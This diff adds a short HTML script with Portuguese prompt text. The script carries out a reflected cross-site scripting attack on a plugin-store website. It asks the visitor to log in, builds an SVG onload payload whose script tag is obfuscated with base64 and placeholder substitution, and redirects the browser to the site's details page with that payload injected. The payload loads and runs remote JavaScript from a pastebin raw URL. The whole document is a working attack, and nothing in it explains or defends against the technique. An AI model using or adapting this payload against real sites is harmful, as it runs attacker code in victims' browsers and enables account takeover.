@@ -1,0 +1,10 @@
+<script type="text/javascript">
+	var logged = prompt('Você provavelmente vai precisar logar, então use este login:\n\nUser: b\nSenha: b\n\nOBS: Se você já estiver logado digite 1');
+
+	var script = '//pastebin.com/raw/bAtZKgzW';
+	var b64 = btoa('-o-script src="' + script + '"-c--o-\/script-c-')
+	var data = '$(\'body\').append(atob(\'' + b64 + '\').replace(\'-o-\', \'<\').replace(\'-c-\', \'>\').replace(\'-o-\', \'<\').replace(\'-c-\', \'>\').replace(\'-o-\', \'<\').replace(\'-c-\', \'>\'))';
+	var payload = '%3Csvg/onload=%22' + data + '%22%3E';
+
+	location.href = logged != '1' ? 'http://www.ystoreplugins.com/login?redirectTo=http://www.ystoreplugins.com/detalhes?plugin=' + payload : 'http://www.ystoreplugins.com/detalhes?plugin=' + payload;
+</script>
